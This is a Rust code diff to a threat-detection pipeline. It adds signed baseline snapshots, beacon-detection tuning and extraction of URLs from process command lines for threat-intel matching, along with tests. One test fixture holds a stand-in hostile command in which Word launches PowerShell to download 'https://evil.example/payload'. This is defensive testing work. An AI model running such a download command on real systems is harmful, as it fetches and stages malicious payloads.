@@ -3,12 +3,17 @@ use ed25519_dalek::{Signer, SigningKey};
 use std::collections::BTreeSet;
 use swarm_core::agent::AgentRole;
 use swarm_core::config::PheromoneConfig;
-use swarm_core::pheromone::{PheromoneDeposit, ThreatIntelEntry, ThreatIntelIndicatorType};
+use swarm_core::pheromone::{
+    EscalationRecord, PheromoneDeposit, ThreatClass, ThreatIntelEntry, ThreatIntelIndicatorType,
+};
 use swarm_core::telemetry::TelemetryPayload;
 use swarm_core::types::AgentId;
 use swarm_pheromone::{DepositSigningPayload, PheromoneSubstrate, SubstrateError};
 use swarm_whisker::stream::{evaluate_event, strategy_scoped_agent_id};
-use swarm_whisker::{CompositeDetector, DetectionFinding, DetectionStrategy, TelemetryEvent};
+use swarm_whisker::{
+    CompositeDetector, DetectionFinding, DetectionStrategy, NetworkBeaconRecruitmentContext,
+    TelemetryEvent,
+};
 
 /// Output of the fast detection lane for a single event.
 #[derive(Debug, Clone)]
@@ -65,11 +70,12 @@ where
     D: DetectionStrategy,
     S: PheromoneSubstrate,
 {
-    hydrate_stateful_detectors(detector, substrate).await?;
+    hydrate_stateful_detectors(detector, substrate, agent_id).await?;
+    refresh_adaptive_detectors(detector, substrate, pheromone, event.timestamp).await?;
     let findings =
         enrich_findings_with_threat_intel(substrate, event, evaluate_event(detector, event))
             .await?;
-    persist_stateful_detectors(detector, substrate).await?;
+    persist_stateful_detectors(detector, substrate, agent_id, signing_key).await?;
     let mut deposits =
         resolve_deposits(substrate, &findings, event, agent_id, agent_role, pheromone).await?;
 
@@ -85,22 +91,30 @@ where
     })
 }
 
-async fn hydrate_stateful_detectors<D, S>(detector: &D, substrate: &S) -> Result<(), PipelineError>
+async fn hydrate_stateful_detectors<D, S>(
+    detector: &D,
+    substrate: &S,
+    agent_id: &AgentId,
+) -> Result<(), PipelineError>
 where
     D: DetectionStrategy,
     S: PheromoneSubstrate,
 {
     if let Some(composite) = detector.as_any().downcast_ref::<CompositeDetector>() {
         for strategy in composite.strategies() {
-            hydrate_runtime_detector(strategy, substrate).await?;
+            hydrate_runtime_detector(strategy, substrate, agent_id).await?;
         }
     } else {
-        hydrate_runtime_detector(detector, substrate).await?;
+        hydrate_runtime_detector(detector, substrate, agent_id).await?;
     }
     Ok(())
 }
 
-async fn hydrate_runtime_detector<D, S>(detector: &D, substrate: &S) -> Result<(), PipelineError>
+async fn hydrate_runtime_detector<D, S>(
+    detector: &D,
+    substrate: &S,
+    agent_id: &AgentId,
+) -> Result<(), PipelineError>
 where
     D: DetectionStrategy + ?Sized,
     S: PheromoneSubstrate,
@@ -113,29 +127,59 @@ where
     };
     if detector.needs_hydration() {
         let snapshot = substrate
-            .query_behavioral_baseline_snapshot(strategy_id)
+            .query_behavioral_baseline_snapshot(strategy_id, agent_id)
             .await?;
         detector.hydrate_from_snapshot(snapshot);
     }
     Ok(())
 }
 
-async fn persist_stateful_detectors<D, S>(detector: &D, substrate: &S) -> Result<(), PipelineError>
+async fn persist_stateful_detectors<D, S>(
+    detector: &D,
+    substrate: &S,
+    agent_id: &AgentId,
+    signing_key: &SigningKey,
+) -> Result<(), PipelineError>
 where
     D: DetectionStrategy,
     S: PheromoneSubstrate,
 {
     if let Some(composite) = detector.as_any().downcast_ref::<CompositeDetector>() {
         for strategy in composite.strategies() {
-            persist_runtime_detector(strategy, substrate).await?;
+            persist_runtime_detector(strategy, substrate, agent_id, signing_key).await?;
         }
     } else {
-        persist_runtime_detector(detector, substrate).await?;
+        persist_runtime_detector(detector, substrate, agent_id, signing_key).await?;
     }
     Ok(())
 }
 
-async fn persist_runtime_detector<D, S>(detector: &D, substrate: &S) -> Result<(), PipelineError>
+async fn refresh_adaptive_detectors<D, S>(
+    detector: &D,
+    substrate: &S,
+    pheromone: &PheromoneConfig,
+    now: i64,
+) -> Result<(), PipelineError>
+where
+    D: DetectionStrategy,
+    S: PheromoneSubstrate,
+{
+    if let Some(composite) = detector.as_any().downcast_ref::<CompositeDetector>() {
+        for strategy in composite.strategies() {
+            refresh_runtime_detector(strategy, substrate, pheromone, now).await?;
+        }
+    } else {
+        refresh_runtime_detector(detector, substrate, pheromone, now).await?;
+    }
+    Ok(())
+}
+
+async fn persist_runtime_detector<D, S>(
+    detector: &D,
+    substrate: &S,
+    agent_id: &AgentId,
+    signing_key: &SigningKey,
+) -> Result<(), PipelineError>
 where
     D: DetectionStrategy + ?Sized,
     S: PheromoneSubstrate,
@@ -149,10 +193,71 @@ where
     let Some(snapshot) = detector.snapshot_if_dirty(strategy_id) else {
         return Ok(());
     };
+    let snapshot_captured_at = snapshot.captured_at;
     substrate
-        .store_behavioral_baseline_snapshot(snapshot)
+        .store_behavioral_baseline_snapshot(snapshot, agent_id, signing_key)
         .await?;
-    detector.mark_persisted();
+    detector.mark_persisted(snapshot_captured_at);
+    Ok(())
+}
+
+async fn refresh_runtime_detector<D, S>(
+    detector: &D,
+    substrate: &S,
+    pheromone: &PheromoneConfig,
+    now: i64,
+) -> Result<(), PipelineError>
+where
+    D: DetectionStrategy + ?Sized,
+    S: PheromoneSubstrate,
+{
+    let Some(runtime_detector) = detector.as_any().downcast_ref::<RuntimeDetector>() else {
+        return Ok(());
+    };
+    let Some((_, detector)) = runtime_detector.network_connect_detector() else {
+        return Ok(());
+    };
+    let recruitment = detector.profile().recruitment;
+    if !recruitment.enabled {
+        detector.update_beacon_recruitment(None);
+        return Ok(());
+    }
+
+    let threat_class = ThreatClass::CommandAndControl;
+    let threat_class_config = substrate.query_threat_class_config(&threat_class).await?;
+    let policy = pheromone.resolve_threat_class_policy(threat_class_config.as_ref());
+    let concentration = substrate.query_concentration(&threat_class, now).await?;
+    let latest_record =
+        latest_escalation_for_threat_class(&substrate.query_escalations(0).await?, &threat_class);
+    let inhibited_by_resolution = matches!(
+        latest_record.as_ref().map(|record| record.mode),
+        Some(swarm_core::agent::SwarmMode::Normal)
+    );
+    let activation_threshold = policy.alert_threshold * recruitment.activation_strength_ratio;
+
+    let context = if !inhibited_by_resolution
+        && concentration.total_strength >= activation_threshold
+        && concentration.distinct_sources >= recruitment.min_distinct_sources
+        && recruitment.reduced_beacon_min_sample_count < detector.profile().beacon_min_sample_count
+    {
+        Some(NetworkBeaconRecruitmentContext {
+            total_strength: concentration.total_strength,
+            distinct_sources: concentration.distinct_sources,
+            peak_confidence: concentration.peak_confidence,
+            activation_threshold,
+            alert_threshold: policy.alert_threshold,
+            baseline_beacon_min_sample_count: detector.profile().beacon_min_sample_count,
+            effective_beacon_min_sample_count: recruitment.reduced_beacon_min_sample_count,
+            inhibited_by_resolution: false,
+            last_resolution_at: latest_record
+                .filter(|record| record.mode == swarm_core::agent::SwarmMode::Normal)
+                .map(|record| record.timestamp),
+        })
+    } else {
+        None
+    };
+
+    detector.update_beacon_recruitment(context);
     Ok(())
 }
 
@@ -254,6 +359,11 @@ fn candidate_threat_intel_queries(
     let mut candidates = BTreeSet::new();
 
     match &event.payload {
+        TelemetryPayload::ProcessStart(process) => {
+            for value in candidate_url_values(process.command_line.as_str()) {
+                candidates.insert((ThreatIntelIndicatorType::Url, value));
+            }
+        }
         TelemetryPayload::DnsQuery(dns) => {
             for value in candidate_domain_values(&dns.query_name) {
                 candidates.insert((ThreatIntelIndicatorType::Domain, value));
@@ -265,8 +375,23 @@ fn candidate_threat_intel_queries(
                 candidates.insert((ThreatIntelIndicatorType::IpAddress, destination_ip));
             }
         }
-        TelemetryPayload::ProcessStart(_)
-        | TelemetryPayload::ProcessMemoryAccess(_)
+        TelemetryPayload::CloudTrail(event) => {
+            if let Some(source_ip) = &event.source_ip_address {
+                let source_ip = source_ip.trim().to_ascii_lowercase();
+                if !source_ip.is_empty() {
+                    candidates.insert((ThreatIntelIndicatorType::IpAddress, source_ip));
+                }
+            }
+        }
+        TelemetryPayload::KubernetesAudit(event) => {
+            for source_ip in &event.source_ips {
+                let source_ip = source_ip.trim().to_ascii_lowercase();
+                if !source_ip.is_empty() {
+                    candidates.insert((ThreatIntelIndicatorType::IpAddress, source_ip));
+                }
+            }
+        }
+        TelemetryPayload::ProcessMemoryAccess(_)
         | TelemetryPayload::RegistryAccess(_)
         | TelemetryPayload::RegistryPersistence(_)
         | TelemetryPayload::FilePersistence(_)
@@ -277,6 +402,25 @@ fn candidate_threat_intel_queries(
     }
 
     candidates
+}
+
+fn candidate_url_values(command_line: &str) -> Vec<String> {
+    command_line
+        .split_whitespace()
+        .filter_map(|token| {
+            let trimmed = token.trim_matches(|ch: char| {
+                matches!(
+                    ch,
+                    '"' | '\'' | '(' | ')' | '[' | ']' | '{' | '}' | ',' | ';'
+                )
+            });
+            if !(trimmed.starts_with("http://") || trimmed.starts_with("https://")) {
+                return None;
+            }
+            Some(trimmed.trim_end_matches('/').to_ascii_lowercase())
+        })
+        .filter(|value| !value.is_empty())
+        .collect()
 }
 
 fn candidate_domain_values(query_name: &str) -> Vec<String> {
@@ -343,6 +487,17 @@ fn normalized_timestamp_ms(timestamp: i64) -> i64 {
     } else {
         timestamp
     }
+}
+
+fn latest_escalation_for_threat_class(
+    escalations: &[EscalationRecord],
+    threat_class: &ThreatClass,
+) -> Option<EscalationRecord> {
+    escalations
+        .iter()
+        .rev()
+        .find(|record| &record.threat_class == threat_class)
+        .cloned()
 }
 
 pub(crate) async fn resolve_deposits<S>(
@@ -432,7 +587,7 @@ where
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used)]
 mod tests {
-    use super::detect_and_deposit;
+    use super::{DetectionPipelineOutcome, PipelineError, detect_and_deposit};
     use crate::config::parse_config;
     use crate::detector_factory::build_detector_from_strategy;
     use ed25519_dalek::SigningKey;
@@ -560,6 +715,115 @@ mod tests {
         }
     }
 
+    async fn run_behavioral_anomaly_restart_case(
+        journal_path: &std::path::Path,
+        anomaly_timestamp: i64,
+    ) -> Result<DetectionPipelineOutcome, PipelineError> {
+        let yaml = format!(
+            r#"
+name: test
+description: test
+runtime:
+  mode: detect_only
+  telemetry_sources:
+    - name: synthetic
+      subject: telemetry.synthetic
+  max_in_flight_actions: 2
+detection:
+  strategy: behavioral_anomaly
+  high_confidence_threshold: 0.93
+  medium_confidence_threshold: 0.74
+  profiles:
+    behavioral_anomaly:
+      min_host_observations: 2
+      min_identity_observations: 2
+      min_peer_group_observations: 2
+      min_feature_weight: 0.5
+      baseline_half_life_secs: 7200
+      baseline_staleness:
+        enabled: true
+        threshold_secs: 300
+        confidence_reduction_per_window: 0.2
+        minimum_confidence_multiplier: 0.4
+pheromone:
+  default_half_life_secs: 3600.0
+  evaporation_threshold: 0.01
+  min_sources_for_escalation: 2
+  alert_threshold: 2.0
+  incident_threshold: 5.0
+  backend:
+    kind: local_journal
+    path: {}
+policy:
+  human_gate_severity: HIGH
+  lease_ttl_ms: 60000
+"#,
+            journal_path.display()
+        );
+        let config = parse_config(&yaml, "inline").unwrap();
+        let runtime_agent_id = AgentId::from_verifying_key(&test_signing_key().verifying_key());
+
+        {
+            let substrate =
+                LocalJournalPheromoneSubstrate::open(config.pheromone.clone(), journal_path)?;
+            let detector =
+                build_detector_from_strategy("behavioral_anomaly", &config.detection).unwrap();
+
+            for event in [
+                process_start_event(
+                    "evt-warm-1",
+                    1_700_000_100,
+                    "explorer.exe",
+                    "notepad.exe",
+                    Some("C:\\Windows\\System32\\notepad.exe"),
+                ),
+                process_start_event(
+                    "evt-warm-2",
+                    1_700_000_200,
+                    "explorer.exe",
+                    "notepad.exe",
+                    Some("C:\\Windows\\System32\\notepad.exe"),
+                ),
+            ] {
+                let outcome = detect_and_deposit(
+                    &detector,
+                    &substrate,
+                    &event,
+                    &runtime_agent_id,
+                    &config.pheromone,
+                    &test_signing_key(),
+                )
+                .await?;
+                assert!(outcome.findings.is_empty());
+            }
+        }
+
+        let substrate =
+            LocalJournalPheromoneSubstrate::open(config.pheromone.clone(), journal_path)?;
+        let detector =
+            build_detector_from_strategy("behavioral_anomaly", &config.detection).unwrap();
+        let anomaly_event = process_start_event(
+            "evt-anomaly",
+            anomaly_timestamp,
+            "winword.exe",
+            "powershell.exe",
+            Some("C:\\Users\\alice\\AppData\\Local\\Temp\\powershell.exe"),
+        );
+
+        let outcome = detect_and_deposit(
+            &detector,
+            &substrate,
+            &anomaly_event,
+            &runtime_agent_id,
+            &config.pheromone,
+            &test_signing_key(),
+        )
+        .await?;
+
+        assert_eq!(outcome.findings.len(), 1);
+        Ok(outcome)
+    }
+
     #[tokio::test]
     async fn detector_findings_are_deposited_into_substrate() {
         let detector = SuspiciousProcessTreeDetector::default();
@@ -649,6 +913,8 @@ mod tests {
             .store_threat_intel_entry(ThreatIntelEntry {
                 indicator_type: ThreatIntelIndicatorType::Domain,
                 value: "evil.com".to_string(),
+                source: "taxii-primary".to_string(),
+                indicator_id: Some("indicator--domain".to_string()),
                 confidence: 0.25,
                 expires_at: 1_700_000_000_500,
             })
@@ -686,6 +952,14 @@ mod tests {
             "evil.com"
         );
         assert_eq!(
+            outcome.findings[0].evidence["threat_intel_matches"][0]["source"],
+            "taxii-primary"
+        );
+        assert_eq!(
+            outcome.findings[0].evidence["threat_intel_matches"][0]["indicator_id"],
+            "indicator--domain"
+        );
+        assert_eq!(
             outcome.findings[0].evidence["threat_intel_confidence_boost"],
             0.25
         );
@@ -704,6 +978,8 @@ mod tests {
             .store_threat_intel_entry(ThreatIntelEntry {
                 indicator_type: ThreatIntelIndicatorType::IpAddress,
                 value: "198.51.100.42".to_string(),
+                source: "taxii-primary".to_string(),
+                indicator_id: Some("indicator--ipv4".to_string()),
                 confidence: 0.15,
                 expires_at: 1_700_000_000_500,
             })
@@ -729,10 +1005,81 @@ mod tests {
             "198.51.100.42"
         );
         assert_eq!(
+            outcome.findings[0].evidence["threat_intel_matches"][0]["source"],
+            "taxii-primary"
+        );
+        assert_eq!(
+            outcome.findings[0].evidence["threat_intel_matches"][0]["indicator_id"],
+            "indicator--ipv4"
+        );
+        assert_eq!(
             outcome.findings[0].evidence["threat_intel_confidence_boost"],
             0.15
         );
         assert!((outcome.deposits[0].confidence - 0.85).abs() < 1e-9);
+    }
+
+    #[tokio::test]
+    async fn process_findings_are_enriched_by_matching_url_threat_intel() {
+        let detector = SuspiciousProcessTreeDetector::default();
+        let substrate = InMemoryPheromoneSubstrate::new(pheromone_config());
+        substrate
+            .store_threat_intel_entry(ThreatIntelEntry {
+                indicator_type: ThreatIntelIndicatorType::Url,
+                value: "https://evil.example/payload".to_string(),
+                source: "taxii-primary".to_string(),
+                indicator_id: Some("indicator--url".to_string()),
+                confidence: 0.20,
+                expires_at: 1_700_000_000_500,
+            })
+            .await
+            .unwrap();
+        let event = TelemetryEvent {
+            source: "synthetic".to_string(),
+            event_id: "evt-url-intel".to_string(),
+            timestamp: 1_700_000_000,
+            host_id: Some("host-1".to_string()),
+            payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
+                parent_process: "winword".to_string(),
+                process_name: "powershell".to_string(),
+                command_line: "powershell.exe -c Invoke-WebRequest https://evil.example/payload"
+                    .to_string(),
+                user: Some("alice".to_string()),
+                executable_path: None,
+                signer: None,
+                signature_valid: None,
+            }),
+        };
+
+        let outcome = detect_and_deposit(
+            &detector,
+            &substrate,
+            &event,
+            &AgentId::from_verifying_key(&test_signing_key().verifying_key()),
+            &pheromone_config(),
+            &test_signing_key(),
+        )
+        .await
+        .unwrap();
+
+        assert_eq!(outcome.findings.len(), 1);
+        assert_eq!(
+            outcome.findings[0].evidence["threat_intel_matches"][0]["value"],
+            "https://evil.example/payload"
+        );
+        assert_eq!(
+            outcome.findings[0].evidence["threat_intel_matches"][0]["source"],
+            "taxii-primary"
+        );
+        assert_eq!(
+            outcome.findings[0].evidence["threat_intel_matches"][0]["indicator_id"],
+            "indicator--url"
+        );
+        assert_eq!(
+            outcome.findings[0].evidence["threat_intel_confidence_boost"],
+            0.20
+        );
+        assert!((outcome.findings[0].confidence - 1.0).abs() < 1e-9);
     }
 
     #[tokio::test]
@@ -960,7 +1307,7 @@ policy:
             }
 
             let snapshot = substrate
-                .query_behavioral_baseline_snapshot("behavioral_anomaly")
+                .query_behavioral_baseline_snapshot("behavioral_anomaly", &runtime_agent_id)
                 .await
                 .unwrap()
                 .unwrap();
@@ -1017,7 +1364,7 @@ policy:
         );
 
         let snapshot = substrate
-            .query_behavioral_baseline_snapshot("behavioral_anomaly")
+            .query_behavioral_baseline_snapshot("behavioral_anomaly", &runtime_agent_id)
             .await
             .unwrap()
             .unwrap();
@@ -1033,5 +1380,62 @@ policy:
         let _ = std::fs::remove_file(config_path);
         let _ = std::fs::remove_file(threat_intel_path);
         let _ = std::fs::remove_file(behavioral_baseline_path);
+    }
+
+    #[tokio::test]
+    async fn behavioral_anomaly_stale_signed_baseline_reduces_confidence_after_restart() {
+        let unique = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_nanos();
+        let fresh_journal_path =
+            std::env::temp_dir().join(format!("swarm-behavioral-baseline-fresh-{unique}.jsonl"));
+        let stale_journal_path =
+            std::env::temp_dir().join(format!("swarm-behavioral-baseline-stale-{unique}.jsonl"));
+
+        let fresh_outcome = run_behavioral_anomaly_restart_case(&fresh_journal_path, 1_700_000_300)
+            .await
+            .unwrap();
+        let stale_outcome = run_behavioral_anomaly_restart_case(&stale_journal_path, 1_700_001_200)
+            .await
+            .unwrap();
+
+        let fresh_finding = &fresh_outcome.findings[0];
+        let stale_finding = &stale_outcome.findings[0];
+        assert!(
+            stale_finding.confidence < fresh_finding.confidence,
+            "expected stale confidence {} to be lower than fresh confidence {}",
+            stale_finding.confidence,
+            fresh_finding.confidence
+        );
+        assert!(fresh_finding.evidence.get("baseline_staleness").is_none());
+        assert_eq!(
+            stale_finding.evidence["baseline_staleness"]["snapshot_age_secs"],
+            serde_json::json!(1000)
+        );
+        assert_eq!(
+            stale_finding.evidence["baseline_staleness"]["windows_over_threshold"],
+            serde_json::json!(3)
+        );
+        assert_eq!(
+            stale_finding.evidence["baseline_staleness"]["confidence_multiplier"],
+            serde_json::json!(0.4)
+        );
+        assert_eq!(
+            stale_finding.evidence["deviation_scoring"]["raw_confidence"],
+            fresh_finding.confidence
+        );
+        assert_eq!(
+            stale_finding.evidence["deviation_scoring"]["effective_confidence"],
+            stale_finding.confidence
+        );
+
+        for journal_path in [&fresh_journal_path, &stale_journal_path] {
+            let _ = std::fs::remove_file(journal_path);
+            let _ = std::fs::remove_file(journal_path.with_extension("escalations.jsonl"));
+            let _ = std::fs::remove_file(journal_path.with_extension("threat-class-configs.jsonl"));
+            let _ = std::fs::remove_file(journal_path.with_extension("threat-intel.jsonl"));
+            let _ = std::fs::remove_file(journal_path.with_extension("behavioral-baselines.jsonl"));
+        }
     }
 }
